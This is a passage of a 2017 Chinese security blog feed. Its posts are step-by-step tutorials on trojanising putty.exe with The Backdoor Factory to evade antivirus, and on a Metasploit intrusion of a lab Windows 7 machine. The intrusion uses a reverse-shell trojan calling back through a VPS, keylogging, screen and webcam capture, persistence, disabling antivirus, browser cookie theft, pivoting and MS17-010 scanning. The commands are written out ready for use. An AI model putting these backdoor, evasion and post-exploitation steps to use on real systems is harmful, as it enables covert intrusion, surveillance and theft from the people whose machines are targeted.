href="#emsp-emsp-少去蹭网，往往免费的东西才是最贵的" class="headerlink" title="&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的"></a>&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的</h4><h4 id="emsp-emsp-珍爱生命，远离黑客"><a href="#emsp-emsp-珍爱生命，远离黑客" class="headerlink" title="&emsp;&emsp;珍爱生命，远离黑客"></a>&emsp;&emsp;珍爱生命，远离黑客</h4><hr>
<h3 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h3><h4 id="emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"><a href="#emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。" class="headerlink" title="&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"></a>&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-HTTPS简介&quot;&gt;&lt;a href=&quot;#0x00-HTTPS简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. HTTPS简介&quot;&gt;&lt;/a&gt;0x00. HTTPS简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。&quot;&gt;&lt;a href=&quot;#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>The-Backdoor-Factory</title>
    <link href="http://TimeS0ng.github.io/2017/10/13/The-Backdoor-Factory/"/>
    <id>http://TimeS0ng.github.io/2017/10/13/The-Backdoor-Factory/</id>
    <published>2017-10-13T14:00:26.000Z</published>
    <updated>2017-10-13T14:02:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-BDF简介"><a href="#0x00-BDF简介" class="headerlink" title="0x00. BDF简介"></a>0x00. BDF简介</h2><h4 id="emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"><a href="#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！" class="headerlink" title="&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"></a>&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！</h4><a id="more"></a>
<hr>
<h2 id="0x01-BDF原理"><a href="#0x01-BDF原理" class="headerlink" title="0x01. BDF原理"></a>0x01. BDF原理</h2><h4 id="emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"><a href="#emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。" class="headerlink" title="&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"></a>&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在<a href="https://www.youtube.com/watch?v=OuyLzkG16Uk" target="_blank" rel="external">blackhat上的演讲</a>，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。</h4><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084" alt="image"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）"><a href="#1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）" class="headerlink" title="1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）"></a>1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）</h4><h4 id="2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的"><a href="#2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的" class="headerlink" title="2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的"></a>2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的</h4><h4 id="3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"><a href="#3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的" class="headerlink" title="3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"></a>3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的</h4><h4 id="4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"><a href="#4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果" class="headerlink" title="4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"></a>4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果</h4><hr>
<h2 id="0x02-BDF安装"><a href="#0x02-BDF安装" class="headerlink" title="0x02. BDF安装"></a>0x02. BDF安装</h2><h3 id="emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"><a href="#emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱" class="headerlink" title="&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"></a>&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱</h3><blockquote>
<p>docker pull secretsquirrel/the-backdoor-factory</p>
<p>docker run -it -v /Users/apple1/Desktop/:/tmp secretsquirrel/the-backdoor-factory bash</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/44CB258820CB477EB4F211B7A63D08CA/3112" alt="image"></p>
<h3 id="【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"><a href="#【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章" class="headerlink" title="【*】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"></a>【*】这里已经启动了docker中的BDF，不太了解docker的可以看看<a href="http://120.78.87.14/?p=719" target="_blank" rel="external">这篇文章</a></h3><hr>
<h2 id="0x03-BDF生成免杀木马"><a href="#0x03-BDF生成免杀木马" class="headerlink" title="0x03. BDF生成免杀木马"></a>0x03. BDF生成免杀木马</h2><h3 id="1-下载将要被注入木马的模版文件"><a href="#1-下载将要被注入木马的模版文件" class="headerlink" title="1. 下载将要被注入木马的模版文件"></a>1. 下载将要被注入木马的模版文件</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EB8C1C8CBEE5416E9FA58026B7C950EF/3124" alt="image"></p>
<h3 id="2-利用BDF生成木马"><a href="#2-利用BDF生成木马" class="headerlink" title="2. 利用BDF生成木马"></a>2. 利用BDF生成木马</h3><blockquote>
<p>./backdoor.py -f /tmp/putty.exe -s iat_reverse_tcp_stager_threaded -J -H 1.1.1.1 -P 4444</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/36A5444E02914ABDBBC8D8CEC35DF77D/3134" alt="image"></p>
<h3 id="3-将生成的木马拖到物理机上"><a href="#3-将生成的木马拖到物理机上" class="headerlink" title="3. 将生成的木马拖到物理机上"></a>3. 将生成的木马拖到物理机上</h3><blockquote>
<p>mv&emsp;/the-backdoor-factory/backdoored/putty.exe&emsp;/tmp/payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/37B7A19072504B0EA5CB1707961D9342/3140" alt="image"></p>
<h3 id="4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"><a href="#4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉" class="headerlink" title="4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"></a>4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EDA07B6C52C045D7A0D690CCC79C6E3A/3147" alt="image"></p>
<hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。"><a href="#emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。" class="headerlink" title="&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。"></a>&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-BDF简介&quot;&gt;&lt;a href=&quot;#0x00-BDF简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. BDF简介&quot;&gt;&lt;/a&gt;0x00. BDF简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot;&gt;&lt;a href=&quot;#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Metasploit</title>
    <link href="http://TimeS0ng.github.io/2017/10/08/Metasploit/"/>
    <id>http://TimeS0ng.github.io/2017/10/08/Metasploit/</id>
    <published>2017-10-08T15:21:39.000Z</published>
    <updated>2018-04-18T03:56:21.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Metasploit-Framework简介"><a href="#0x00-Metasploit-Framework简介" class="headerlink" title="0x00. Metasploit Framework简介"></a>0x00. Metasploit Framework简介</h2><h4 id="emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"><a href="#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！" class="headerlink" title="&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"></a>&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！</h4><a id="more"></a>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/WEBRESOURCE3e65a795a3f7fcac430185b407c010bb/2777" alt="image"></p>
<hr>
<h2 id="0x01-实战操作"><a href="#0x01-实战操作" class="headerlink" title="0x01. 实战操作"></a>0x01. 实战操作</h2><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><h4 id="1-靶机win-7-emsp-IP-192-168-43-150"><a href="#1-靶机win-7-emsp-IP-192-168-43-150" class="headerlink" title="1. 靶机win 7 &emsp; IP=192.168.43.150"></a>1. 靶机win 7 &emsp; IP=192.168.43.150</h4><h4 id="2-kali-linux-emsp-IP-192-168-43-153"><a href="#2-kali-linux-emsp-IP-192-168-43-153" class="headerlink" title="2. kali linux &emsp; IP=192.168.43.153"></a>2. kali linux &emsp; IP=192.168.43.153</h4><h4 id="3-VPS服务器-emsp-IP-xx-xx-xx-xx"><a href="#3-VPS服务器-emsp-IP-xx-xx-xx-xx" class="headerlink" title="3. VPS服务器 &emsp; IP=xx.xx.xx.xx"></a>3. VPS服务器 &emsp; IP=xx.xx.xx.xx</h4><h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><h3 id="1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"><a href="#1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）" class="headerlink" title="1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"></a>1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）</h3><blockquote>
<p>vi /etc/ssh/sshd_config &amp;&amp; GatewayPorts:yes</p>
<p>ssh -CfNg -R xx.xx.xx.xx:2333:192.168.43.153:2333 root@xx.xx.xx.xx -p 29402</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/B0A29DC18557456A8233E113B2E545A7/2805" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE26F3A8040346ABAB760ECE9324382F/2786" alt="image"></p>
<h3 id="2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"><a href="#2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章" class="headerlink" title="2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"></a>2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个<a href="http://www.freebuf.com/sectool/67674.html" target="_blank" rel="external">系列文章</a></h3><blockquote>
<p>[*]如果想要在docker启动持续监听可以用如下命令</p>
<p>set exitonsession false &amp;&amp; run -j</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/9CD797025E3C4F73B6249F645BFB89A9/2796" alt="image"></p>
<h3 id="3-在win-7-中执行木马"><a href="#3-在win-7-中执行木马" class="headerlink" title="3. 在win 7 中执行木马"></a>3. 在win 7 中执行木马</h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/5A6F7DAC4D274B64A4CFD66B0080B835/2803" alt="image"></p>
<h3 id="4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程"><a href="#4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程" class="headerlink" title="4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程"></a>4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程</h3><blockquote>
<p>migrate 1988 &amp;&amp; getpid</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6F701A71ADC74D9886456ACAD234579A/2807" alt="image"></p>
<h3 id="5-查看当前权限、系统信息，并尝试提权"><a href="#5-查看当前权限、系统信息，并尝试提权" class="headerlink" title="5. 查看当前权限、系统信息，并尝试提权"></a>5. 查看当前权限、系统信息，并尝试提权</h3><blockquote>
<p>getuid &amp;&amp; sysinfo &amp;&amp; getsystem</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/E4A2C214EB80482099D8EC2FAD4EAD5B/2809" alt="image"></p>
<h3 id="6-查看网络、路由信息"><a href="#6-查看网络、路由信息" class="headerlink" title="6. 查看网络、路由信息"></a>6. 查看网络、路由信息</h3><blockquote>
<p>ifconfig &amp;&amp; route</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6952617E2F0C487D9961361455423D8F/2811" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7BD2DDFFF9C34C97BCC4B83CBBCE460F/2813" alt="image"></p>
<h3 id="7-监视靶机的桌面"><a href="#7-监视靶机的桌面" class="headerlink" title="7. 监视靶机的桌面"></a>7. 监视靶机的桌面</h3><blockquote>
<p>run vnc</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1341936A33D348D9BFA015BD4152A84B/2815" alt="image"></p>
<h3 id="8-启动键盘监听"><a href="#8-启动键盘监听" class="headerlink" title="8. 启动键盘监听"></a>8. 启动键盘监听</h3><blockquote>
<p>keyscan_start &amp;&amp; keyscan_dump</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1048F53C0DB74D29B1966D4DAEFB375C/2817" alt="image"></p>
<h3 id="9-设置后门，维持权限"><a href="#9-设置后门，维持权限" class="headerlink" title="9. 设置后门，维持权限"></a>9. 设置后门，维持权限</h3><blockquote>
<p>run metsvc -A<br>use exploit/multi/handler<br>set payload windows/metsvc_bind_tcp</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115559_zGxh98_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115615_n2yKpJ_Screenshot.jpeg" alt=""></p>
<h3 id="10-截屏查看靶机当前桌面"><a href="#10-截屏查看靶机当前桌面" class="headerlink" title="10. 截屏查看靶机当前桌面"></a>10. 截屏查看靶机当前桌面</h3><blockquote>
<p>screenshot</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6AA05CFBB24A4F58B4B4073C76EA86E7/2821" alt="image"></p>
<h3 id="11-查看当前系统空闲时间"><a href="#11-查看当前系统空闲时间" class="headerlink" title="11. 查看当前系统空闲时间"></a>11. 查看当前系统空闲时间</h3><blockquote>
<p>idletime</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/79CB8D02C9DE4A5AA6B59C8064C0406B/2823" alt="image"></p>
<h3 id="12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）"><a href="#12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）" class="headerlink" title="12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）"></a>12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）</h3><blockquote>
<p>uictl disable keyboard</p>
<p>uictl disable mouse</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1153DFFD1E3E45148071B6547CF0CB28/2825" alt="image"></p>
<h3 id="13-查找靶机中重要的敏感文件"><a href="#13-查找靶机中重要的敏感文件" class="headerlink" title="13. 查找靶机中重要的敏感文件"></a>13. 查找靶机中重要的敏感文件</h3><blockquote>
<p>search -d c:\\ -f payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7FA2C1C2A0F9495D853E8DBE84F3F921/2829" alt="image"></p>
<h3 id="14-指定下载靶机中的文件到本地"><a href="#14-指定下载靶机中的文件到本地" class="headerlink" title="14. 指定下载靶机中的文件到本地"></a>14. 指定下载靶机中的文件到本地</h3><blockquote>
<p>dowmload&emsp;c:\\Users\\root\\Desktop\\payload.exe&emsp;/root/Desktop</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/D64579685D6946E0A1778127C2DC0C89/2831" alt="image"></p>
<h3 id="15-上传指定本地文件到靶机中"><a href="#15-上传指定本地文件到靶机中" class="headerlink" title="15. 上传指定本地文件到靶机中"></a>15. 上传指定本地文件到靶机中</h3><blockquote>
<p>upload&emsp;/root/Desktop/hack.jpeg&emsp;c:\\Users\\root\\Desktop\\payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/590D4B293166484BB1B80C740B766889/2833" alt="image"></p>
<h3 id="16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应"><a href="#16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应" class="headerlink" title="16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应"></a>16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应</h3><blockquote>
<p>webcam_snap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/30AFC5056C0C488CAC1B401A54657300/2835" alt="image"></p>
<h3 id="17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"><a href="#17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面" class="headerlink" title="17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"></a>17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面</h3><blockquote>
<p>portfwd add -l 3344 -p 3389 -r 127.0.0.1</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418114855_mYPjG6_Screenshot.jpeg" alt=""></p>
<hr>
<h1 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02. 后渗透测试"></a>0x02. 后渗透测试</h1><h3 id="1-调用post模块查看当前系统可用的提权模块"><a href="#1-调用post模块查看当前系统可用的提权模块" class="headerlink" title="1. 调用post模块查看当前系统可用的提权模块"></a>1. 调用post模块查看当前系统可用的提权模块</h3><blockquote>
<p>run post/multi/recon/local_exploit_suggester</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/062DCEF953D0483885263D3B68EA6500/2837" alt="image"></p>
<h3 id="2-调用payload模块对靶机进行远程桌面操作"><a href="#2-调用payload模块对靶机进行远程桌面操作" class="headerlink" title="2. 调用payload模块对靶机进行远程桌面操作"></a>2. 调用payload模块对靶机进行远程桌面操作</h3><blockquote>
<p>set payload windows/vncinject/reverse_tcp</p>
<p>set viewonly no </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/24C3AE7DA38B47D38AD244E1A85412BD/2839" alt="image"></p>
<h3 id="3-关掉靶机中的杀软"><a href="#3-关掉靶机中的杀软" class="headerlink" title="3. 关掉靶机中的杀软"></a>3. 关掉靶机中的杀软</h3><blockquote>
<p>killav</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/98E2F5E758294B1D99BE113B0CDAD0F3/2841" alt="image"></p>
<h3 id="4-收集靶机浏览器的敏感信息-访问记录、cookie"><a href="#4-收集靶机浏览器的敏感信息-访问记录、cookie" class="headerlink" title="4. 收集靶机浏览器的敏感信息(访问记录、cookie)"></a>4. 收集靶机浏览器的敏感信息(访问记录、cookie)</h3><blockquote>
<p>run post/windows/gather/enum_ie</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C1568F9B9B8746F990D13D51A9BE3367/2843" alt="image"></p>
<h3 id="5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions"><a href="#5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions" class="headerlink" title="5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)"></a>5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)</h3><blockquote>
<p>route add 92.168.43.150 255.255.255.0 3</p>
<p>use auxiliary/scanner/portscan/tcp</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE904338A187447E9E4C6EB5627C3F3E/2847" alt="image"></p>
<h3 id="6-扫描一波内网有没有ms17-010漏洞的主机"><a href="#6-扫描一波内网有没有ms17-010漏洞的主机" class="headerlink" title="6. 扫描一波内网有没有ms17_010漏洞的主机"></a>6. 扫描一波内网有没有ms17_010漏洞的主机</h3><blockquote>
<p>use auxiliary/scanner/smb/smb_ms17_010</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/935810641BBC43FF8EB483C0AD4A2343/2849" alt="image"></p>
